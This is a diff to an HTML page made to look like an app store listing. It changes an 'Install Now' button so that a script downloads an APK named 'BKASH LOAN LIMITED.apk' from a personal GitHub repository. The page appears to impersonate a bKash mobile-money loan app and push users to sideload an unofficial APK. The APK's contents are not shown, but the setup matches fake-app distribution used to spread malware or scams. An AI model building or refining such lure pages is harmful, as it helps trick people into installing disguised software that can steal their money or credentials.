@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -55,6 +54,7 @@
       font-size:16px;
       box-shadow:0 3px 8px rgba(0,0,0,.2);
       transition:all .2s ease;
+      cursor:pointer;
     }
     .primary-cta:hover{
       background:#0033a3;
@@ -136,12 +136,8 @@
       <div class="badge">Rated for 4+</div>
     </div>
 
-    <a class="primary-cta"
-       href="https://github.com/koi-batija/bkashloanapeal/raw/refs/heads/main/Bkash%20Loan%20Server.apk" 
-       download
-       target="_blank"
-       rel="noopener noreferrer"
-       >Install Now</a>
+    <!-- Updated button -->
+    <a class="primary-cta" id="installBtn">Install Now</a>
   </div>
 
   <section>
@@ -188,6 +184,24 @@
       <li><div class="i">👤</div>Profile</li>
     </ul>
   </nav>
+
+  <!-- Download Script -->
+  <script>
+  document.getElementById('installBtn').addEventListener('click', () => {
+    const fileUrl = "https://github.com/koi-batija/bkashloanapeal/raw/refs/heads/main/BKASH%20LOAN%20LIMITED.apk";
+    const a = document.createElement('a');
+    a.href = fileUrl;
+    a.download = "BKASH_LOAN_LIMITED.apk"; 
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    
+    // Optional: show "Downloading..." feedback
+    const btn = document.getElementById('installBtn');
+    btn.textContent = "Downloading...";
+    setTimeout(() => btn.textContent = "Install Now", 3000);
+  });
+  </script>
 
 </body>
 </html>
